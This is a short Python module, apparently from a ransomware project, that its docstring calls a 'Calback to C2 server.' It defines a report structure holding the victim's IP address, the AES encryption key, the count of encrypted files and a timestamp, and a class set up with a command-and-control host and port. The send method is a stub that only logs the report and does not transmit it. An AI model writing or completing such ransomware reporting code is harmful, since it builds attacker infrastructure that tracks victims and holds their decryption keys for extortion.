"""
Calback to C2 server.
"""

from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path

from utils.logger import get_logger


@dataclass
class C2Report:
    ip: str
    file_encrypted: int
    aes_key: str
    duration: int
    timestamp: str


class C2Integration:
    def __init__(
        self,
        c2_host: str,
        c2_port: int,
        log_file: Path | None = None,
    ):
        self._host = c2_host
        self._port = c2_port

        self._logger = get_logger(__name__, log_file=log_file)

    def _to_payload(
        self,
        ip: str,
        aes_key: str,
        file_encrypted: int,
        duration: int,
    ):
        return C2Report(
            ip=ip,
            aes_key=aes_key,
            file_encrypted=file_encrypted,
            duration=duration,
            timestamp=datetime.now(timezone.utc).isoformat(),
        )

    def send(
        self,
        payload: C2Report,
    ):
        self._logger.info(payload)
